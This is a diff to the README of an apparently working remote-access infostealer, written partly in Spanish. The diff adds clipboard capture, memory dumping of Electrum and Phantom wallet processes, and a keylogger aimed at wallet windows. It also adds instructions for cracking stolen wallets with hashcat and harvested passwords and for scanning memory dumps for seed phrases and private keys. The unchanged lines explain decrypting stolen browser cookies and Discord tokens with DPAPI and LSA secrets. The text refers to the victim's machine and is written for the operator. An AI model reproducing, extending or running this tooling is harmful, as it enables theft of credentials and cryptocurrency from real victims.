@@ -37,7 +37,7 @@ Local state in `config.json`: version, channel, webhook, last ID and last heartb
 
 ## Commands
 
-`help`, `shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `bootstrap`, `hives`, `screenshot`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
+`help`, `shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `bootstrap`, `hives`, `screenshot`, `clip`, `memdump <electrum|phantom|pid>`, `keys on|off|dump`, `clear`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
 
 `help` lists the commands in the channel; `bootstrap` re-runs the automatic first-run collection.
 
@@ -137,7 +137,15 @@ Los riesgos de huella en el equipo de la víctima están en [`docs/OPSEC.md`](do
 ./decrypt.py legacy-harvest.zip --machinekey <hex>  # old raw v20 without ABE
 ```
 
-A 0.2.7 harvest carries validated `discord/token.txt`, `v20=` in `keys.txt` and plaintext ABE TSV, so v20 cookies and the Discord token open without `-p` or `--machinekey`. Older harvests still need the Windows password, and v20 without ABE still needs the DPAPI_SYSTEM machinekey, which is an LSA secret: `secretsdump.py -system SYSTEM.hiv -security SECURITY.hiv LOCAL` prints `dpapi_machinekey` and `dpapi_userkey`; pass them as `--machinekey` and `--system-userkey` with the copied folder (`--system-protect`). Chrome flag-3/flag-4 keys also need `Google Chromekey1` from `hives/SystemKeys` (`--ksp`, auto-detected). Chrome's blob format differs between Windows builds (ANSI + alg-id strings versus UTF-16 CNG), both are parsed. `cryptography` is required, `plyvel` only for Phantom and `zstandard` only for some Exodus payloads; missing optional pieces are reported, never fatal.
+A 0.2.7 harvest carries validated `discord/token.txt`, `v20=` in `keys.txt` and plaintext ABE TSV, so v20 cookies and the Discord token open without `-p` or `--machinekey`. Older harvests still need the Windows password, and v20 without ABE still needs the DPAPI_SYSTEM machinekey, which is an LSA secret: `secretsdump.py -system SYSTEM.hiv -security SECURITY.hiv LOCAL` prints `dpapi_machinekey` and `dpapi_userkey`; pass them as `--machinekey` and `--system-userkey` with the copied folder (`--system-protect`). Chrome flag-3/flag-4 keys also need `Google Chromekey1` from `hives/SystemKeys` (`--ksp`, auto-detected). Chrome's blob format differs between Windows builds (ANSI + alg-id strings versus UTF-16 CNG), both are parsed. `cryptography` is required, `plyvel` (o el lector puro `ccl_chromium_reader`) solo para Phantom y `zstandard` solo para algunos payloads de Exodus; las piezas opcionales que falten se reportan, nunca son fatales.
+
+### Carteras que no se abren solas
+
+- **Electrum:** `tools/ingest-case.sh` exporta `wallets/electrum-*.enc` y un hash `wallets/electrum-*.john` para hashcat (`-m 16600`). Con `--win-password`/`-p` prueba esa contraseña y las de `secrets/*-logins.tsv`.
+- **Phantom:** `tools/phantom-decrypt.py --case <caso> --logins -p '...'` prueba contraseñas contra los blobs sellados (PBKDF2-SHA256 + XChaCha20-Poly1305). Sale el mnemonic o el `phantom-seed-*.bin`.
+- **Sin contraseña:** si Electrum/Phantom están desbloqueados, `memdump electrum` o `memdump phantom` vuelca la memoria del proceso; `tools/dump-scan.py volcado.dmp` busca seeds BIP39 (checksum validado), `xprv` y claves Solana. `clip` lee el portapapeles y `keys on|off|dump` captura lo tecleado solo en ventanas de Electrum/Phantom.
+
+Las carteras de Electrum cifradas (BIE1) se exportan como `wallets/electrum-*.enc` y un hash `wallets/electrum-*.john` para hashcat (`-m 16600`); con `-p` se abren directamente. Phantom guarda el seed y su clave sellados con la contraseña de la extensión: se extraen a `wallets/phantom/`, pero no se descifran sin ella. MetaMask, si está, necesita su propia contraseña.
 
 ## Persistence
 
